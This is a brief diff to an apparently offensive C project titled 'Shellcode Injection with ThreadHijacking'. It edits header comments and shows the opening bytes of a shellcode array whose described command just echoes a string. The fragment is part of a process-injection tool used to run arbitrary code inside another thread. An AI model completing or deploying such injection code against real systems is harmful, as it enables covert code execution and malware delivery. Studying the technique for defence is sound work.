@@ -1,6 +1,6 @@
 /*
 
->* Shellcode Injection with ThreadHijacking *<
+>* Threadhijacking with ThreadHijacking *<
 
 @author:  x1nerama (bekoo)
 @website: x1nerama.github.io
@@ -14,7 +14,7 @@
 #include <stdlib.h>
 
 /* 
-    cmd /K "ThreadHijacking with bekoo"
+    cmd /K "echo ThreadHijacking with bekoo"
 */
 char Shellcode[] =
 "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
